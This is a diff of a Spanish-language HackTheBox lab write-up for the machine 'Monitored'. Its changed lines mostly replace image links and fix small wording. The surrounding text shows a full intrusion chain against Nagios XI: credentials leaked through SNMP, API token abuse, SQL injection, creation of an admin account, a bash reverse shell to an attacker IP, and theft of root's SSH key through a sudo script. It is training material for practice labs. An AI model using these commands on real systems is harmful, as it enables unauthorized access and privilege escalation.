@@ -1,11 +1,11 @@
 
+![image](https://github.com/user-attachments/assets/e1dc76ea-687f-480b-b83c-22030ef8f9f7)
 
-![[Pasted image 20250508185235.png]]
 
 
 **Publicado:** 08 de Mayo de 2025 
 **Autor:** José Miguel Romero aka x3m1Sec 
-**Dificultad:** ⭐ Easy
+**Dificultad:** ⭐ Medium
 
 ## 📝 Descripción
 
@@ -158,10 +158,11 @@ echo "10.10.11.248 nagios.monitored.htb monitored.htb" | sudo tee -a /etc/hosts
 
 
 
-![[Pasted image 20250508185715.png]]
+![image](https://github.com/user-attachments/assets/cd8f0bce-e437-4473-bf30-97fad6ad51aa)
 
 
-![[Pasted image 20250508185818.png]]
+![image](https://github.com/user-attachments/assets/3873441a-0609-4b66-bed3-0d6d4d6b793b)
+
 
 
 Nagios es otro sistema y producto de monitoreo de red. Nagios ha tenido una amplia variedad de problemas a lo largo de los años, incluida la ejecución remota de código, la escalada de privilegios de raíz, la inyección SQL, la inyección de código y el XSS almacenado. Si se encuentra con una instancia de Nagios, vale la pena buscar las credenciales predeterminadas `nagiosadmin:PASSW0RD` y tomar las huellas digitales de la versión.
@@ -174,7 +175,8 @@ Relizamos fuzzing de vhosts por si pudiésemoa añadir algo más a nuestro scope
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://monitored.htb -H 'Host:FUZZ.monitored.htb' -fc 301
 ```
-![[Pasted image 20250508190419.png]]
+![image](https://github.com/user-attachments/assets/31e1775c-724e-401e-a174-caafe1657079)
+
 
 
 #### 🕷️ Fuzzing de directorios
@@ -184,7 +186,8 @@ feroxbuster -u https://nagios.monitored.htb -r  -w /usr/share/seclists/Discovery
 ```
 
 
-![[Pasted image 20250508194516.png]]
+![image](https://github.com/user-attachments/assets/36a3ea54-908c-4583-aae5-53e83a72a732)
+
 Como único hallazgo relevante encontramos el recurso /nagiosxi
 
 NOTA: indicamos la flag -k para omitir los certificados TLS inválidos
@@ -196,7 +199,8 @@ Usamos el siguiente script para la enumeración LDAP:
 
 Anonymous bind está deshabilitado.
 
-![[Pasted image 20250508191824.png]]
+![image](https://github.com/user-attachments/assets/c06b61dc-e7ce-44d9-b3b5-996bc0f5000b)
+
 
 También podemos verificarlo con ldapsearch:
 
@@ -219,7 +223,8 @@ Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
 
 Hay mucha información pero en la parte relativa a "procesos" descubrimos algo interesante:
 
-![[Pasted image 20250508193131.png]]
+![image](https://github.com/user-attachments/assets/73cfa053-eacc-4cc4-bad2-ba75ab045ee5)
+
 
 Parece que se está llamando un script con el usuario svc y una contraseña:
 
@@ -228,9 +233,10 @@ Parece que se está llamando un script con el usuario svc y una contraseña:
 
 Probamos esta contraseña con diversos servicios como SSH, a intentar enumerar LDAP con credenciales y con el panel de login de Nagios, pero no tenemos éxito, aunque sí notamos que algo cambia en el panel de login de Nagios en el mensaje que recibimos:
 
-![[Pasted image 20250508193835.png]]
+![image](https://github.com/user-attachments/assets/4752f358-3964-4295-898a-4c42d643e8f6)
 
-Ya nos nos indica `Invalid username or password.`ahora tenemos otro error distinto lo cual nos hace sospechar que el usuarios svc exista con esas credenciales pero ha sido deshabilitado porque además el error es distinto si la contraseña no es correcta.
+
+Ya no nos indica `Invalid username or password.`ahora tenemos otro error distinto lo cual nos hace sospechar que el usuarios svc exista con esas credenciales pero ha sido deshabilitado porque además el error es distinto si la contraseña no es correcta.
 
 
 Tenemos credenciales, pero no podemos acceder a la interfaz web debido a que la cuenta está deshabilitada.
@@ -247,8 +253,9 @@ Si lo usamos usando las credenciales descubiertas obtenemos un token que es vál
 ```bash
 curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
 ```
+![image](https://github.com/user-attachments/assets/13b88f3a-7e4e-4ddb-9677-c022a51a85ec)
 
-![[Pasted image 20250508194802.png]]
+
 
 Seguimos las instrucciones del post para ver cómo puede usarse este token:
 
@@ -260,7 +267,8 @@ curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trend
 curl -k -L 'http://10.10.11.248/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=befcb077e9767d71b63d7370aea15281a7691a5d' > image.png
 ```
 
-![[Pasted image 20250508195028.png]]
+![image](https://github.com/user-attachments/assets/baff7646-f389-43f0-ae00-981927235744)
+
 
 Funciona así que si aplicamos esta misma lógica al recurso /nagiosxi/index.php?token=XXX deberíamos tener acceso al index de la página:
 
@@ -270,7 +278,9 @@ https://nagios.monitored.htb/nagiosxi/index.php?token=bbe75ef7172d84c04ac070f457
 
 
 Logramos acceder con éxito y enumerar la versión: 5.11.0
-![[Pasted image 20250508195527.png]]
+![image](https://github.com/user-attachments/assets/3850019d-cc2f-4412-b912-fe3467281810)
+
+
 
 Parece que esa versión es vulnerable a SQL injection:[CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)
 https://pentest-tools.com/vulnerabilities-exploits/nagios-xi-v5110-sql-injection_23763
@@ -286,11 +296,13 @@ Nagios XI features “Announcement Banners”, which can optionally be acknowled
 
 Activamos el interceptor de Burpsuite y refrescamos la página y cambiamos la petición a POST:
 
-![[Pasted image 20250508201156.png]]
+![image](https://github.com/user-attachments/assets/d1fdf13b-7887-474a-bbd1-d90ea9c5d6f4)
+
 
 Nota: Asegurarse de cambiar el valor Cookie por la cookie de autenticación de su sesión.
 
-![[Pasted image 20250508201549.png]]
+![image](https://github.com/user-attachments/assets/c59d78aa-3f61-46fc-a6f5-9696f9ebeaff)
+
 Enviando la petición, vemos un error SQL en la pestaña Respuesta, confirmando que podemos inyectar consultas SQL en el servicio. 
 
 
@@ -344,15 +356,18 @@ curl -k --silent "http://nagios.monitored.htb/nagiosxi/api/v1/system/user&apikey
 {"success":"User account pentester was added successfully!","user_id":6}
 ```
 
-![[Pasted image 20250508202353.png]]
+![image](https://github.com/user-attachments/assets/e938940d-c8ff-4ac0-b34c-f3b735fa3e99)
+
 
 Logramos acceder con nuestra nueva cuenta:
 
-![[Pasted image 20250508202456.png]]
+![image](https://github.com/user-attachments/assets/a357ec9b-0d90-459c-a8e3-ad7021957696)
+
 
 Nos pide cambiar la contraseña la primera vez que ingresamos. Una vez hecho, a continuación nos vamos a Configure > Core Config Manager > Commands
 
-![[Pasted image 20250508202627.png]]
+![image](https://github.com/user-attachments/assets/e666efca-d668-495c-86e0-df241143d1aa)
+
 
 A continuación introducimos el siguiente payload para obtener una reverse shell:
 
@@ -360,7 +375,8 @@ A continuación introducimos el siguiente payload para obtener una reverse shell
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/1234 0>&1'
 ```
 
-![[Pasted image 20250508202820.png]]
+![image](https://github.com/user-attachments/assets/a71f8e60-4702-436a-bfb8-d6914e1cb2c7)
+
 Aplicamos la configuración.
 
 Iniciamos un listener en el puerto que hayamos configurado:
@@ -374,7 +390,8 @@ Por último, vamos a Monitorización > Hosts y pulsamos sobre localhost . Selecc
 
 Hacemos click en Run Check Command y deberemos recibir nuestra reverse shell:
 
-![[Pasted image 20250508203416.png]]
+![image](https://github.com/user-attachments/assets/02d5f8a2-e625-4a14-9588-08ba3737eb57)
+
 
 
 Obtenemos la primera flag:
@@ -389,7 +406,8 @@ nagios@monitored:~$
 
 Al hacer un sudo -l observamos que nagios puede ejecutar una gran variedad de scripts como sudo:
 
-![[Pasted image 20250508203547.png]]
+![image](https://github.com/user-attachments/assets/f22213a4-538d-4b70-818a-a066d3a46773)
+
 
 Uno de los que más nos puede interesar es el de getprofile.sh
 
@@ -424,8 +442,9 @@ Esto requiere que tengamos acceso a /usr/local/nagiosxi/tmp/phpmailer.log ,así 
 ls -la /usr/local/nagiosxi/tmp/phpmailer.log 
 ls -la /usr/local/nagiosxi/
 ```
+![image](https://github.com/user-attachments/assets/67df0328-72af-41b4-b70a-3f39bf258b01)
 
-![[Pasted image 20250508204306.png]]
+
 
 Aunque el archivo de registro no existe, tenemos permisos de escritura en su directorio padre. A continuación, comprobamos la configuración SSH para ver si la autenticación como root está habilitada, y si PubkeyAuthentication está habilitado.
 
@@ -433,7 +452,8 @@ Aunque el archivo de registro no existe, tenemos permisos de escritura en su dir
 cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'
 ```
 
-![[Pasted image 20250508204352.png]]
+![image](https://github.com/user-attachments/assets/aee32535-a449-452d-a42c-d3c73bac13b0)
+
 
 Esta configuración significa que si el usuario root tiene una clave privada en su directorio .ssh, podremos usarla para autenticar.
 
@@ -465,7 +485,8 @@ unzip profile.zip
 cat profile-/phpmailer.log
 ```
 
-![[Pasted image 20250508204959.png]]
+![image](https://github.com/user-attachments/assets/0d1692a1-effc-4bda-80f9-db1974209f05)
+
 
 Copiamos la clave privada a nuestro host de ataque y le damos permiso 600 y nos conectamos vía ssh como root y obtenemos la flag:
 
@@ -473,7 +494,8 @@ Copiamos la clave privada a nuestro host de ataque y le damos permiso 600 y nos 
 ssh -i id_rsa root@10.10.11.248   
 ```
 
-![[Pasted image 20250508205137.png]]
+![image](https://github.com/user-attachments/assets/e30847fb-1c20-4e40-b67b-dcc5d37670cc)
+
 
 
 
